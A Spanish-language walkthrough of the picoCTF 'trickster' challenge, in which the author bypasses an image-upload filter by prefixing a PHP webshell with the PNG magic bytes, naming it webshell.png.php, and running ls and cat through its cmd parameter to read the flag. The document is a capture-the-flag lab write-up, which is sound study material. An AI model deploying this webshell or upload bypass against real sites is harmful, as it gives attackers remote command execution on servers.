### Descripción 
I found a web app that can help process images: PNG images only! Try it [here](http://atlas.picoctf.net:64895/)!
### Solución 
entré al link del reto y le agregué robots.txt al likn para ver que encontraba 
http://atlas.picoctf.net:63239/robots.txt
encontré el archivo instruccions.txt y lo abrí y encontré las siguientes pistas:  busca la extensión png, los primeros bytes contienen PNG en hexadecimal: 50 4E 47 
así que cree un archivo webshell que cumpliera con esas validaciones para poder ejecutar comandos
┌──(kali㉿kali)-[~/picoCTF/trickster]
└─$ nano webshell

┌──(kali㉿kali)-[~/picoCTF/trickster]
└─$ cat webshell 
PNG
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
┌──(kali㉿kali)-[~/picoCTF/trickster]
└─$ cp webshell  webshell.png.php
──(kali㉿kali)-[~/picoCTF/trickster]
└─$ xxd webshell.png.php
00000000: 504e 470a 3c3f 7068 700a 6966 2869 7373  PNG.<?php.if(iss
00000010: 6574 2824 5f47 4554 5b27 636d 6427 5d29  et($_GET['cmd'])
00000020: 2920 7b0a 2020 2020 6563 686f 2022 3c70  ) {.    echo "<p
00000030: 7265 3e22 3b0a 2020 2020 7379 7374 656d  re>";.    system
00000040: 2824 5f47 4554 5b27 636d 6427 5d29 3b0a  ($_GET['cmd']);.
00000050: 2020 2020 6563 686f 2022 3c2f 7072 653e      echo "</pre>
00000060: 223b 0a7d 0a3f 3e0a                      ";.}.?>.

lo subí  y al ejecutar ls .. encontré un archivo extraño llamado GQ4DOOBVMMYGK.txt el cual al ver el contenido tenía la bandera
http://atlas.picoctf.net:50585/uploads/webshell.png.php?cmd=ls 
http://atlas.picoctf.net:50585/uploads/webshell.png.php?cmd=%20cat%20../GQ4DOOBVMMYGK.txt
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e}
### Notas adicionales
### Referencias